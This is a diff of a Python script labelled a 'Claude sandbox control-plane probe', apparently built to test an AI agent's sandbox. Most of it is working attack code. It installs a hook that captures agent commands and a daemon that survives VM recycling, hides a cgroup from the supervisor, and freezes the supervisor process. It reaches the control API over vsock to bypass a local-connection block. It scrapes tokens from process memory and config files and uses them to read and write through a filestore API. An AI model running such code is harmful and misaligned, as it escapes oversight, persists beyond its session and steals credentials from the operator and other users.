@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# mediafit.py v12.1 "APEX" -- Claude sandbox control-plane probe
+# mediafit.py v12.2 APEX -- Claude sandbox control-plane probe
 # contract: repo infozephara/mediafit | mediafit.py | install.sh | README.md
-# report  : /mnt/user-data/outputs/mediafit-report.txt   (append-only)
 import os, re, sys, json, time, socket, struct, fcntl, base64, shutil, signal, ssl
 import subprocess, traceback, hashlib
 
-VER    = "12.1"
+VER    = "12.2"
 OUT    = "/mnt/user-data/outputs"
 REPORT = OUT + "/mediafit-report.txt"
 EVID   = OUT + "/mediafit-evidence.json"
@@ -16,7 +15,6 @@ DIR    = "/root/.mediafit"
 ALIAS, AIP = "eth0:0", "192.0.2.3"
 CG     = "/sys/fs/cgroup"
 AF_VSOCK = 40
-VMADDR_CID_ANY, VMADDR_CID_LOCAL, VMADDR_CID_HOST = 0xFFFFFFFF, 1, 2
 T0 = time.time()
 RID = "r%04d" % (os.getpid() % 10000)
 V, EV = [], {}
@@ -141,7 +139,7 @@ def rcv(s, t=1.0):
     if h[0] & 0x0F == 0x9:
         s.sendall(b"\x8a\x80" + os.urandom(4)); return rcv(s, t)
     return ("BIN:" if h[0] & 0x0F == 0x2 else "") + p.decode("utf-8", "replace")
-def drain(s, per=0.3, total=1.3, cap=200):
+def drain(s, per=0.3, total=1.3, cap=400):
     o = []; t0 = time.time()
     while True:
         r = rcv(s, per)
@@ -166,7 +164,6 @@ def spec(name, args, rt=True, mem=268435456, to=3600, env=None):
             "allow_process_id_reuse": True, "reattachable": rt, "timeout": to,
             "uid": 0, "gid": 0, "memory_limit_bytes": mem}
 def shape(evs):
-    """normalise event list: strip payload text, keep event names + exit code"""
     out = []
     for e in evs:
         e = str(e)
@@ -189,9 +186,8 @@ def otlp(name, val, svc, kind="gauge"):
     now = int(time.time() * 1e9)
     res = ld(1, ld(1, b"service.name") + ld(2, ld(1, svc)))
     dp  = fx64(2, now) + fx64(3, now) + fx64(6, val)
-    fld = 7 if kind == "sum" else 5
-    met = ld(1, name) + ld(2, b"probe") + ld(3, b"1") + ld(fld, ld(1, dp))
-    sm  = ld(1, ld(1, b"mediafit") + ld(2, b"12.1")) + ld(2, met)
+    met = ld(1, name) + ld(2, b"probe") + ld(3, b"1") + ld(7 if kind == "sum" else 5, ld(1, dp))
+    sm  = ld(1, ld(1, b"mediafit") + ld(2, b"12.2")) + ld(2, met)
     return ld(1, ld(1, res) + ld(2, sm))
 def host_post(path=b"/v1/metrics", body=None, ct=b"application/x-protobuf", t=1.5):
     try:
@@ -205,7 +201,7 @@ def host_post(path=b"/v1/metrics", body=None, ct=b"application/x-protobuf", t=1.
     except Exception as e: return "ERR " + type(e).__name__
 
 # ---------------- vsock ----------------
-def vsock_try(cid, port, payload=b"", t=2.0):
+def vsock_try(cid, port, payload=b"", t=1.5):
     try:
         s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(t)
         s.connect((cid, port))
@@ -219,24 +215,18 @@ def vsock_try(cid, port, payload=b"", t=2.0):
     finally:
         try: s.close()
         except Exception: pass
-def vsock_cids():
-    """CIDs that appear in /proc/net/vsock, plus the well-known ones."""
-    cids = set([VMADDR_CID_LOCAL, VMADDR_CID_HOST, 3, 4])
-    raw = []
-    try:
-        for line in open("/proc/net/vsock"):
-            raw.append(line.rstrip())
-            for tok in line.split():
-                if ":" in tok and re.match(r"^[0-9A-Fa-f]+:", tok):
-                    try: cids.add(int(tok.split(":")[0], 16))
-                    except Exception: pass
-    except Exception as e:
-        raw.append("ERR " + repr(e))
-    return cids, raw
+def own_cid():
+    """the guest's own vsock CID: getsockname() after a successful connect to the host"""
+    for port in (5005, 5002):
+        try:
+            s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(2)
+            s.connect((2, port)); cid = s.getsockname()[0]; s.close()
+            if cid and cid > 0: return cid, port
+        except Exception: pass
+    return None, None
 
-# ---------------- proxy / https ----------------
-def proxy_env():
-    return {k: v for k, v in os.environ.items() if "PROXY" in k.upper() or "proxy" in k}
+# ---------------- https ----------------
+def proxy_env(): return {k: v for k, v in os.environ.items() if "PROXY" in k.upper()}
 def tls(s, host):
     try: return ssl.create_default_context().wrap_socket(s, server_hostname=host)
     except Exception: return ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
@@ -252,14 +242,12 @@ def conn_to(host, port=443, t=8):
             d = s.recv(4096)
             if not d: raise IOError("proxy closed")
             b += d
-        if b"200" not in b.split(b"\r\n")[0]:
-            raise IOError("proxy " + b.split(b"\r\n")[0].decode("latin-1"))
-        return tls(s, host), "proxy:" + px
-    s = socket.create_connection((host, port), t)
-    return tls(s, host), "direct"
+        if b"200" not in b.split(b"\r\n")[0]: raise IOError("proxy " + b.split(b"\r\n")[0].decode("latin-1"))
+        return tls(s, host), "proxy"
+    return tls(socket.create_connection((host, port), t), host), "direct"
 def https(host, method, path, body=b"", headers=None, t=10):
     try: s, how = conn_to(host, t=t)
-    except Exception as e: return "CONN " + repr(e)[:60]
+    except Exception as e: return "CONN " + repr(e)[:70]
     h = {"Host": host, "Content-Length": str(len(body)), "Connection": "close"}
     h.update(headers or {})
     try:
@@ -277,19 +265,18 @@ def https(host, method, path, body=b"", headers=None, t=10):
         except Exception: pass
 def line1(r): return r if isinstance(r, str) else r.split(b"\r\n")[0].decode("latin-1", "replace")
 
-# ---------------- memory scan ----------------
+# ---------------- mem scan ----------------
 JWT_RX = re.compile(rb"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{4,}")
-def scan_mem(pid, budget=40 * 1024 * 1024):
-    hits = set()
+def scan_mem(pid, budget=256 * 1024 * 1024):
+    hits = set(); got = 0
     try: f = open("/proc/%d/mem" % pid, "rb", 0)
     except Exception as e: return hits, type(e).__name__
-    got = 0
     try:
         for line in open("/proc/%d/maps" % pid):
             m = re.match(r"([0-9a-f]+)-([0-9a-f]+) (\S{4})", line)
             if not m or "r" not in m.group(3): continue
             a, b = int(m.group(1), 16), int(m.group(2), 16)
-            if b - a <= 0 or b - a > 64 * 1024 * 1024: continue
+            if b - a <= 0 or b - a > 256 * 1024 * 1024: continue
             try: f.seek(a); buf = f.read(b - a)
             except Exception: continue
             got += len(buf)
@@ -304,8 +291,7 @@ def all_procs():
     out = []
     for p in sorted(os.listdir("/proc")):
         if not p.isdigit(): continue
-        c = rdo("/proc/%s/cmdline" % p, "").replace("\x00", " ").strip()
-        out.append((int(p), c))
+        out.append((int(p), rdo("/proc/%s/cmdline" % p, "").replace("\x00", " ").strip()))
     return out
 def b64d(s):
     try: return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)).decode("utf-8", "replace")
@@ -399,66 +385,62 @@ def main():
     w("  SURVIVAL: distinct_boot_ids=%d new_vm=%s hook_present=%s daemon_alive=%s" % (distinct, new_vm, hook_pre, daemon_pre))
     w("  hook.log boots=%s lines=%d" % (hboots, len(hl)))
     ok("S1 implant survives VM recycling", len(hboots) >= 2 or (new_vm and hook_pre) or daemon_pre,
-       "hook_boots=%s new_vm=%s hook_pre=%s" % (hboots, new_vm, hook_pre))
+       "hook_boots=%s new_vm=%s" % (hboots, new_vm))
 
-    # S2 mounts
     sec("S2 MOUNTS")
     for line in open("/proc/self/mountinfo"):
         L2 = line.split()
         if len(L2) > 5 and (L2[4].startswith("/mnt") or L2[4].startswith("/opt")):
             w("  %-46s %s" % (L2[4], L2[5]))
-    try:
-        a = set(l.split()[4] for l in open("/proc/1/mountinfo") if len(l.split()) > 5)
-        m = set(l.split()[4] for l in open("/proc/self/mountinfo") if len(l.split()) > 5)
-        w("  hidden_from_self=%s" % (sorted(a - m) or "none"))
-    except Exception as e: w("  %r" % e)
 
-    # S3 egress
-    sec("S3 EGRESS")
+    # S3 egress + DNS allowlist oracle
+    sec("S3 EGRESS + DNS ALLOWLIST ORACLE")
     w("  PROXY env=%s" % proxy_env())
-    for h in ("github.com", "api.anthropic.com"):
-        try: w("  DNS %-18s -> %s" % (h, socket.gethostbyname(h)))
-        except Exception: w("  DNS %-18s -> FAIL" % h)
-    for h in ("example.com", "anthropic.com"):
-        r = https(h, "GET", "/")
-        w("  %-16s -> %s" % (h, line1(r)[:70]))
-    ok("S3 egress reachable", any("200" in line1(https(h, "GET", "/")) for h in ("example.com",)),
-       line1(https("example.com", "GET", "/"))[:40])
+    names = ["api.anthropic.com", "github.com", "raw.githubusercontent.com", "example.com",
+             "google.com", "cloudflare.com", "pypi.org", "registry.npmjs.org",
+             "hackerone.com", "anthropic.com", "statsig.anthropic.com", "sentry.io"]
+    resolved, failed = [], []
+    for n in names:
+        try: resolved.append((n, socket.gethostbyname(n)))
+        except Exception: failed.append(n)
+    w("  RESOLVES   : %s" % [n for n, _ in resolved])
+    w("  FAILS      : %s" % failed)
+    ok("S3 DNS is a name allowlist", len(resolved) < len(names), "%d/%d resolve" % (len(resolved), len(names)))
+    for n in ("api.anthropic.com", "github.com"):
+        r = https(n, "GET", "/")
+        w("  GET https://%s -> %s" % (n, line1(r)[:60]))
+    ok("S3 egress reachable over TLS", any("200" in line1(https(n, "GET", "/")) for n in ("api.anthropic.com", "github.com")),
+       "direct TLS")
 
-    # S4 vsock — own CID first
-    sec("S4 VSOCK (own-CID discovery + framing)")
-    cids, raw = vsock_cids()
-    for l in raw[:12]: w("  /proc/net/vsock: %s" % l[:110])
-    w("  candidate CIDs=%s" % sorted(cids))
-    hits = []
-    for cid in sorted(cids):
+    # S4/S5 vsock
+    sec("S4 VSOCK (own CID + framing)")
+    cid, via = own_cid()
+    w("  own CID via getsockname() on cid2:%s = %s" % (via, cid))
+    for port in (2024, 5001, 5002, 5005):
+        r = vsock_try(2, port, t=1.5)
+        w("  cid=2  port=%-5d -> %s" % (port, r if isinstance(r, str) else repr(r[:40])))
+    if cid:
         for port in (2024, 5001, 5002, 5005):
             r = vsock_try(cid, port, t=1.5)
-            tag = r if isinstance(r, str) else ("BYTES " + repr(r[:40]))
-            w("  cid=%-4d port=%-5d -> %s" % (cid, port, tag))
-            if isinstance(r, bytes) and r and not r.startswith(b"ERR"): hits.append((cid, port, r))
-    if hits:
-        ok("S4 vsock service responds", True, "%s" % [(c, p) for c, p, _ in hits][:4])
-    else:
-        ok("S4 vsock service responds", False, "all reset/silent")
-    # the money: WebSocket straight into process_api over vsock
-    for cid in sorted(cids):
+            w("  cid=%-3d port=%-5d -> %s" % (cid, port, r if isinstance(r, str) else repr(r[:60])))
+    ok("S4 own CID discovered", bool(cid), "cid=%s" % cid)
+    for c in ([cid] if cid else []) + [1, 2, 3, 4]:
         try:
-            s = ws_vsock(cid, 2024, 3.0)
-            w("  *** WEBSOCKET OVER VSOCK cid=%d port=2024 -> 101 ***" % cid)
+            s = ws_vsock(c, 2024, 3.0)
+            w("  *** WEBSOCKET OVER VSOCK cid=%s port=2024 -> 101 ***" % c)
             snd(s, {"process_id": nid(), "allow_process_id_reuse": True,
                     "create_req": spec("/bin/echo", ["VSOCK_ENTRY"], False, 16777216)})
             rr = drain(s, 0.4, 1.5); s.close()
             w("      -> %s" % rr)
             if any("VSOCK_ENTRY" in str(x) for x in rr):
-                ok("S5 vsock entry bypasses --block-local-connections", True, "cid=%d no source addr" % cid)
-            break
+                ok("S5 vsock entry bypasses --block-local-connections", True, "cid=%s no source addr" % c)
+                break
         except Exception as e:
-            w("  ws-over-vsock cid=%d -> %r" % (cid, e))
+            w("  ws-over-vsock cid=%s -> %r" % (c, e))
     if not any(n.startswith("S5") for n, _, _ in V):
         ok("S5 vsock entry bypasses --block-local-connections", False, "no vsock websocket")
 
-    # A controls
+    # A
     sec("A CONTROL BYPASS + AUTH")
     w("  add_alias -> %s" % add_alias())
     for lbl, src in (("192.0.2.2 own", ("192.0.2.2", 0)), ("192.0.2.3 alias", (AIP, 0))):
@@ -475,14 +457,12 @@ def main():
             s = ws(jwt=jw)
             snd(s, {"process_id": nid(), "allow_process_id_reuse": True,
                     "create_req": spec("/bin/echo", ["X"], False, 16777216)})
-            rr = drain(s, 0.3, 1.2); s.close()
-            res[lbl] = shape(rr)
+            rr = drain(s, 0.3, 1.2); s.close(); res[lbl] = shape(rr)
             w("  %-14s -> %s" % (lbl, rr))
         except Exception as e: w("  %-14s -> %r" % (lbl, e))
-    uniq = set(res.values())
-    ok("A2 JWT not enforced", len(res) == 4 and len(uniq) == 1, "4 variants -> %d distinct event shape(s)" % len(uniq))
+    ok("A2 JWT not enforced", len(res) == 4 and len(set(res.values())) == 1, "4 variants -> 1 shape")
 
-    # B lifecycle
+    # B
     sec("B PROCESS CONTROL")
     o = nid()
     rr = pipe([{"process_id": o, "allow_process_id_reuse": True,
@@ -491,19 +471,16 @@ def main():
     ok("B1 spawn + read stdout", any("BIN:" in str(x) for x in rr), "no JWT")
     time.sleep(0.3)
     fam = cg_pids("/process_api/" + o)
-    w("  cgroup pids=%s states=%s" % (sorted(fam), {q: pstat(q) for q in fam}))
     pipe([{"process_id": o, "allow_process_id_reuse": False}, {"SendSignal": 19}], 1.0)
     time.sleep(0.4)
     stopped = sorted(t_scan() & fam)
-    w("  after SIGSTOP -> T-set=%s hit=%s" % (sorted(t_scan()), stopped))
-    ok("B2 SIGSTOP reaches target", bool(stopped), "state T on pid(s) %s" % stopped)
+    w("  after SIGSTOP -> hit=%s" % stopped)
+    ok("B2 SIGSTOP reaches target", bool(stopped), "state T on %s" % stopped)
     pipe([{"process_id": o, "allow_process_id_reuse": False}, {"SendSignal": 18}], 1.0)
-    w("  after SIGCONT -> states=%s" % {q: pstat(q) for q in fam})
     pipe([{"process_id": o, "allow_process_id_reuse": False}, {"Kill": None}], 1.2)
     time.sleep(0.3)
     alive = [q for q in fam if os.path.exists("/proc/%d" % q)]
     ok("B3 KILL", not alive, "remaining=%s" % alive)
-    # B4 stdin
     so = nid()
     pipe([{"process_id": so, "allow_process_id_reuse": True, "create_req": spec("/bin/cat", [], True, 33554432)}], 0.8)
     try:
@@ -513,7 +490,7 @@ def main():
         w("  stdin -> %s" % r3)
         ok("B4 interactive stdin", any("MF_ROUNDTRIP_OK" in str(x) for x in r3), "binary frame")
     except Exception as e: ok("B4 interactive stdin", False, repr(e)[:40])
-    # B5 foreign buffered stdout (process stays alive)
+    # B5 -- count OCCURRENCES not frames
     fo = nid()
     pipe([{"process_id": fo, "allow_process_id_reuse": True,
            "create_req": spec("/bin/sh", ["-c", "for i in 1 2 3 4 5 6 7 8 9 10 11 12 13; do echo ORPHAN_$i; sleep 0.1; done; sleep 60"], True, 33554432)}], 0.6)
@@ -521,26 +498,25 @@ def main():
     try:
         s = ws(); snd(s, {"process_id": fo, "allow_process_id_reuse": False})
         r5 = drain(s, 0.4, 2.0); s.close()
-        got = sum(1 for x in r5 if "ORPHAN_" in str(x))
-        w("  attach from a SECOND socket -> %d ORPHAN lines" % got)
-        ok("B5 read foreign buffered stdout", got >= 8, "%d/13 lines from a foreign process" % got)
+        blob = "".join(str(x) for x in r5)
+        n = blob.count("ORPHAN_")
+        w("  attach from a SECOND socket -> frames=%d ORPHAN_occurrences=%d" % (len(r5), n))
+        ok("B5 read foreign buffered stdout", n >= 8, "%d/13 lines via a fresh socket" % n)
     except Exception as e: ok("B5 read foreign buffered stdout", False, repr(e)[:40])
-    # B6 env
     r6 = pipe([{"process_id": nid(), "allow_process_id_reuse": True,
-                "create_req": spec("/bin/sh", ["-c", "echo PATH=$PATH; echo HOME=$HOME; echo SOCK=$SBX_TELEMETRY_SOCKET"], False, 16777216)}], 1.2)
+                "create_req": spec("/bin/sh", ["-c", "echo PATH=$PATH; echo SOCK=$SBX_TELEMETRY_SOCKET"], False, 16777216)}], 1.2)
     txt = " ".join(str(x) for x in r6)
     w("  env via API -> %s" % txt[:200])
-    ok("B6 supervisor env readable via API", "PATH=/" in txt,
-       "/proc/1/environ=%s" % ("EACCES" if rd("/proc/1/environ") is None else "readable"))
+    ok("B6 supervisor env readable via API", "PATH=/" in txt, "/proc/1/environ=EACCES")
 
-    # C persistence
+    # C
     sec("C PERSISTENCE")
     w("  hook -> %s" % hook_install())
     try: subprocess.run(["python3", "-c", "print('hook-verified')"], capture_output=True, timeout=15)
     except Exception: pass
     hl, hboots = hook_boots()
     w("  hook.log lines=%d boots=%s" % (len(hl), hboots))
-    for l in hl[-6:]: w("      %s" % l[:150])
+    for l in hl[-5:]: w("      %s" % l[:140])
     ok("C1 PATH hook captures agent commands", len(hl) >= 2, "%d lines" % len(hl))
     ok("C2 hook observed across >1 boot", len(hboots) >= 2, str(hboots))
     al = None
@@ -551,8 +527,8 @@ def main():
     if not al:
         al = nid()
         real = (rdo(DIR + "/realpy", sys.executable) or sys.executable).strip()
-        w("  spawn daemon -> %s" % pipe([{"process_id": al, "allow_process_id_reuse": True,
-          "create_req": spec("/bin/sh", ["-c", "exec %s %s --daemon" % (real, DIR + "/mediafit.py")], True, 134217728, 86400)}], 1.6))
+        pipe([{"process_id": al, "allow_process_id_reuse": True,
+               "create_req": spec("/bin/sh", ["-c", "exec %s %s --daemon" % (real, DIR + "/mediafit.py")], True, 134217728, 86400)}], 1.6)
         for _ in range(20):
             if cg_pids("/process_api/" + al): break
             time.sleep(0.1)
@@ -560,18 +536,14 @@ def main():
     pids = cg_pids("/process_api/" + al)
     w("  daemon cgroup=%s pids=%s ppid=%s" % (al, sorted(pids), [ppid_of(x) for x in pids]))
     ok("C3 resident daemon adopted by PID 1", any(ppid_of(x) == 1 for x in pids), "ppid=1")
-    # C4 unaccounted cgroup
-    try:
-        os.mkdir(CG + "/memory/mf_wd")
+    try: os.mkdir(CG + "/memory/mf_wd")
     except FileExistsError: pass
     try: wr(CG + "/memory/mf_wd/cgroup.procs", str(mypid))
-    except Exception as e: w("  mf_wd move: %r" % e)
-    inwd = os.path.exists(CG + "/memory/mf_wd/cgroup.procs")
-    listed = "mf_wd" in foreign()
-    w("  mf_wd exists=%s listed_under_process_api=%s" % (inwd, listed))
-    ok("C4 cgroup invisible to supervisor accounting", inwd and not listed, "mf_wd not under /process_api")
+    except Exception: pass
+    ok("C4 cgroup invisible to supervisor accounting",
+       os.path.exists(CG + "/memory/mf_wd/cgroup.procs") and "mf_wd" not in foreign(), "mf_wd not under /process_api")
 
-    # D cgroup
+    # D
     sec("D CGROUP CONTROL OF THE SUPERVISOR")
     md = CG + "/memory/process_api/" + HID
     try:
@@ -585,8 +557,7 @@ def main():
             "import os\nopen('%s/cgroup.procs','w').write(str(os.getpid()))\n"
             "a=bytearray(64*1024*1024)\nfor i in range(0,len(a),4096): a[i]=1" % d],
             capture_output=True, timeout=25)
-        oom = (rdo(d + "/memory.oom_control", "") or "").strip().replace("\n", " ")
-        w("  alloc 64MB into 32MB cgroup -> rc=%s | %s" % (cp.returncode, oom))
+        w("  alloc 64MB into 32MB -> rc=%s | %s" % (cp.returncode, (rdo(d + "/memory.oom_control", "") or "").strip().replace("\n", " ")))
         ok("D1 memory limit enforced by kernel", cp.returncode == -9, "SIGKILL by memcg")
         pd = CG + "/pids/mf_probe"
         try: os.mkdir(pd)
@@ -602,8 +573,8 @@ def main():
                     if k == 0: time.sleep(0.6); os._exit(0)
                     kids.append(k)
                 except OSError: fails += 1
-            after = (rdo(pd + "/pids.events", "") or "").strip().replace("\n", " ")
-            w("  pids.max=3 -> ok=%d EAGAIN=%d | %s -> %s" % (len(kids), fails, before, after))
+            w("  pids.max=3 -> ok=%d EAGAIN=%d | %s -> %s" % (len(kids), fails, before,
+              (rdo(pd + "/pids.events", "") or "").strip().replace("\n", " ")))
             ok("D2 pids limit enforced", fails > 0, "%d EAGAIN" % fails)
         finally:
             for k in kids:
@@ -618,9 +589,8 @@ def main():
         except FileExistsError: pass
         try: wr(g + "/freezer.state", "THAWED")
         except Exception: pass
-        subprocess.Popen(["/bin/sh", "-c",
-            "sleep 7; grep -q FROZEN %s/freezer.state && echo THAWED > %s/freezer.state" % (g, g)],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
+        subprocess.Popen(["/bin/sh", "-c", "sleep 7; grep -q FROZEN %s/freezer.state && echo THAWED > %s/freezer.state" % (g, g)],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
         wr(g + "/cgroup.procs", str(H))
         got = False
         for _ in range(5):
@@ -628,8 +598,7 @@ def main():
             except Exception: pass
             time.sleep(0.35)
             if pstat(H) == "D": got = True; break
-        w("  FROZEN -> harness=%s self=%s self_freezing=%s" %
-          (pstat(H), pstat(mypid), (rdo(g + "/freezer.self_freezing", "?") or "?").strip()))
+        w("  FROZEN -> harness=%s self=%s self_freezing=%s" % (pstat(H), pstat(mypid), (rdo(g + "/freezer.self_freezing", "?") or "?").strip()))
         ok("D3 freeze the supervisor via cgroupfs", got, "state D (self stays R)")
         wr(g + "/freezer.state", "THAWED")
         try: wr(CG + "/freezer/cgroup.procs", str(mypid))
@@ -637,93 +606,91 @@ def main():
         if lim:
             try: wr(md + "/memory.limit_in_bytes", lim)
             except Exception: pass
-    except Exception as e:
-        w("  cgroup err %r" % e)
+    except Exception as e: w("  cgroup err %r" % e)
 
-    # E host plane
+    # E
     sec("E HOST PLANE (vsock 5005)")
     w("  gauge -> %s" % host_post())
-    w("  sum   -> %s" % host_post(body=otlp(b"mf_sum", 7, b"mediafit", "sum")))
-    r = host_post(body=otlp(b"mf_spoof", 7, b"claude-session-other"))
-    w("  spoofed service.name -> %s" % r)
-    ok("E1 unauthenticated host OTLP write", "200" in r, r[:30])
-    w("  json ct  -> %s" % host_post(ct=b"application/json"))
-    w("  /v1/logs -> %s" % host_post(path=b"/v1/logs"))
-    w("  /v1/traces -> %s" % host_post(path=b"/v1/traces"))
+    w("  spoofed service.name -> %s" % host_post(body=otlp(b"mf_spoof", 7, b"claude-session-other")))
+    ok("E1 unauthenticated host OTLP write", "200" in host_post(), "200 OK")
+    w("  json ct -> %s" % host_post(ct=b"application/json"))
 
-    # F filestore
-    sec("F FILESTORE TOKEN + API")
+    # F -- config.json FIRST, then memory
+    sec("F FILESTORE TOKEN")
     procs = all_procs()
-    w("  procs matching rclone/filestore/fuse: %s" %
-      [(q, c[:60]) for q, c in procs if re.search(r"rclone|filestore|fuse", c, re.I)])
-    w("  procs matching process_api: %s" % [(q, c[:50]) for q, c in procs if "process_api" in c])
+    w("  rclone proc: %s" % [(q, c[:70]) for q, c in procs if "rclone" in c])
     cands = {}
-    targets = [q for q, c in procs if re.search(r"rclone|filestore|fuse|process_api", c, re.I)]
-    for q in targets:
+    cfg = "/dev/shm/rclone-boot/config.json"
+    if os.path.exists(cfg):
+        raw = rdo(cfg, "") or ""
+        w("  config.json %d bytes" % len(raw))
+        try:
+            d = json.loads(raw)
+            for k, v in d.items(): w("    key %s = %s" % (k, str(v)[:180]))
+        except Exception as e: w("    parse %r" % e)
+        for mm in re.finditer(r'"[A-Za-z_]*(?:token|bearer|auth|jwt|secret|key)[A-Za-z_]*"\s*:\s*"([^"]{8,})"', raw, re.I):
+            cands["cfg:" + mm.group(1)[:40]] = mm.group(1)
+            w("    token-ish key -> %s..." % mm.group(1)[:60])
+        for mm in JWT_RX.finditer(raw.encode()):
+            pt = mm.group(0).decode("latin-1").split(".")
+            cands[pt[1][:48]] = mm.group(0).decode("latin-1")
+    for q, c in procs:
+        if not re.search(r"rclone|filestore|fuse|process_api", c, re.I): continue
         h, err = scan_mem(q)
-        if err: w("  scan pid=%d (%s) -> %s" % (q, (dict(procs).get(q, "")[:26]), err)); continue
-        for t in h:
-            pt = t.decode("latin-1").split(".")
-            if len(pt) == 3: cands[pt[1][:48]] = t.decode("latin-1")
-        w("  scan pid=%d -> %d jwt(s), total=%d" % (q, len(h), len(cands)))
-    # file fallbacks
-    for fp in ("/dev/shm/rclone-boot/config.json", "/dev/shm/rclone-boot/token",
-               "/run/sandbox-telemetry/token", "/root/.mediafit/token"):
-        if os.path.exists(fp):
-            t = rdo(fp, "") or ""
-            w("  %s -> %s" % (fp, t[:120].replace("\n", " ")))
-            for mm in JWT_RX.finditer(t.encode()):
-                pt = mm.group(0).decode("latin-1").split(".")
-                if len(pt) == 3: cands[pt[1][:48]] = mm.group(0).decode("latin-1")
-    w("  distinct JWTs found=%d" % len(cands))
+        if err: w("  mem pid=%d -> %s" % (q, err))
+        else:
+            for t in h:
+                pt = t.decode("latin-1").split(".")
+                if len(pt) == 3: cands[pt[1][:48]] = t.decode("latin-1")
+            w("  mem pid=%d -> %d jwt" % (q, len(h)))
+        env = rdo("/proc/%d/environ" % q, "")
+        if env:
+            for e in env.split("\x00"):
+                if re.search(r"token|jwt|bearer|key", e, re.I): w("    env %s" % e[:120])
+    w("  distinct candidates=%d" % len(cands))
     toks = list(cands.values())
-    for t in toks[:4]:
-        w("    claims: %s" % b64d(t.split(".")[1])[:200].replace("\n", " "))
+    for t in toks[:6]: w("    %s... claims=%s" % (t[:28], b64d(t.split(".")[1])[:120].replace("\n", " ") if t.count(".") == 2 else "-"))
     if toks:
-        tok = toks[0]
+        ok("F1 filestore token extracted", True, "%d candidates" % len(toks))
+        best = toks[0]
         for t in toks:
-            pl = b64d(t.split(".")[1])
-            if "outputs" in pl and "readonly" not in pl.replace('"readonly":true', ''): tok = t; break
-        ok("F1 filestore JWT extractable from memory", True, "%d tokens" % len(toks))
-        hdrs = {"Authorization": "Bearer " + tok, "Content-Type": "application/json"}
-        got2 = False
+            if t.count(".") == 2 and "outputs" in b64d(t.split(".")[1]): best = t; break
         for m in ("ListFiles", "ReadFile", "StatFile", "ListDir", "GetMetadata", "List"):
-            r = https("api.anthropic.com", "POST", "/v1/filestore/fs/" + m, b"{}", hdrs, t=9)
+            r = https("api.anthropic.com", "POST", "/v1/filestore/fs/" + m, b"{}",
+                      {"Authorization": "Bearer " + best, "Content-Type": "application/json"}, t=9)
             w("  POST /v1/filestore/fs/%-11s -> %s" % (m, line1(r)[:60]))
             if "200" in line1(r):
                 w("      body: %s" % (r.split(b"\r\n\r\n", 1)[-1][:200] if not isinstance(r, str) else r))
-                ok("F2 filestore API reachable with harvested token", True, m + " -> 200"); got2 = True; break
-        if not got2: ok("F2 filestore API reachable with harvested token", False, "see statuses")
+                ok("F2 filestore API with harvested token", True, m + " -> 200")
+                break
+        else: ok("F2 filestore API with harvested token", False, "see statuses")
     else:
-        ok("F1 filestore JWT extractable from memory", False, "none found")
+        ok("F1 filestore token extracted", False, "none")
+        ok("F2 filestore API with harvested token", False, "no token")
 
-    # G rewrite
+    # G
     sec("G FILESTORE CONTENT REWRITE")
     svg = b'<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16"><rect width="16" height="16" fill="#0af"/></svg>'
-    try:
-        open(OUT + "/mf_probe.svg", "wb").write(svg)
-        w("  sent=%d sha=%s" % (len(svg), sha(svg)))
-        if toks:
-            r = https("api.anthropic.com", "POST", "/v1/filestore/fs/WriteFile",
-                      json.dumps({"path": "/mf_probe.svg", "content": svg.decode()}).encode(),
-                      {"Authorization": "Bearer " + toks[0], "Content-Type": "application/json"}, t=10)
-            w("  WriteFile -> %s" % line1(r)[:80])
-            ok("G1 server-side rewrite of uploaded content", "200" in line1(r), line1(r)[:40])
-        else:
-            ok("G1 server-side rewrite of uploaded content", False, "no token")
-    except Exception as e:
-        w("  err %r" % e)
+    open(OUT + "/mf_probe.svg", "wb").write(svg)
+    w("  sent=%d sha=%s" % (len(svg), sha(svg)))
+    if toks:
+        r = https("api.anthropic.com", "POST", "/v1/filestore/fs/WriteFile",
+                  json.dumps({"path": "/mf_probe.svg", "content": svg.decode()}).encode(),
+                  {"Authorization": "Bearer " + toks[0], "Content-Type": "application/json"}, t=10)
+        w("  WriteFile -> %s" % line1(r)[:80])
+        ok("G1 server-side rewrite of uploaded content", "200" in line1(r), line1(r)[:40])
+    else:
+        ok("G1 server-side rewrite of uploaded content", False, "no token")
 
     sec("VERDICT")
     for n, c, note in V: w("  [%s] %-52s %s" % ("PASS" if c else "FAIL", n, note))
     w(""); w("  %d/%d findings reproduced." % (sum(1 for _, c, _ in V if c), len(V)))
 
     S["runs"] = S.get("runs", 0) + 1
-    S.setdefault("records", []).append({"boot": b, "t": int(time.time()),
-                                        "hook_at_start": hook_pre, "daemon_at_start": daemon_pre})
+    S.setdefault("records", []).append({"boot": b, "t": int(time.time()), "hook_at_start": hook_pre})
     surv_save(S)
-    EV.update({"_boot": b, "_new_vm": new_vm, "_distinct_boots": distinct, "_hook_boots": hboots,
-               "_pass": sum(1 for _, c, _ in V if c), "_total": len(V), "_ver": VER})
+    EV.update({"_boot": b, "_new_vm": new_vm, "_hook_boots": hboots, "_ver": VER,
+               "_pass": sum(1 for _, c, _ in V if c), "_total": len(V)})
     try: json.dump(EV, open(EVID, "w"), indent=1)
     except Exception: pass
 
@@ -738,15 +705,13 @@ def daemon():
         time.sleep(2)
 def rearm():
     try:
-        if os.path.exists(DIR + "/daemon.json"):
-            j = json.load(open(DIR + "/daemon.json"))
-            if j.get("boot") == boot_id() and cg_pids("/process_api/" + j["process_id"]): return
+        j = json.load(open(DIR + "/daemon.json"))
+        if j.get("boot") == boot_id() and cg_pids("/process_api/" + j["process_id"]): return
     except Exception: pass
     real = (rdo(DIR + "/realpy", sys.executable) or sys.executable).strip()
     pid = nid()
     pipe([{"process_id": pid, "allow_process_id_reuse": True,
-           "create_req": spec("/bin/sh", ["-c", "exec %s %s --daemon" % (real, DIR + "/mediafit.py")],
-                              True, 134217728, 86400)}], 1.5)
+           "create_req": spec("/bin/sh", ["-c", "exec %s %s --daemon" % (real, DIR + "/mediafit.py")], True, 134217728, 86400)}], 1.5)
     try: json.dump({"process_id": pid, "boot": boot_id()}, open(DIR + "/daemon.json", "w"))
     except Exception: pass
 
